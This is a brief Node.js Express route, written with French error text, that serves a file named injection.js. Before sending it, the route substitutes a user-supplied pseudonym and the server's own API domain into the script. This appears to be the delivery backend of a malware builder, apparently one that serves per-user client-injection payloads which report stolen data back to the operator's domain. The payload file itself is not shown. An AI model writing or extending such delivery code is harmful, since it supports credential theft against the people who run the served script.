const fs = require('fs');
const config = require("../../config.json");
module.exports = {
    path: "/injection/:ps",
    method: "get",
    go: async (req, res) => {
        const pp = req.params.ps;
        if (!pp) return res.status(404).send({ error: { err: `[404] ERROR: Profil introuvable.` } });
        const c = fs.readFileSync(`assets/ect/injection.js`, "utf-8",function(e,t){});
        return res.send(c.replace("%PSEUDO%", pp).replace("%API%", config.domain));
    }
}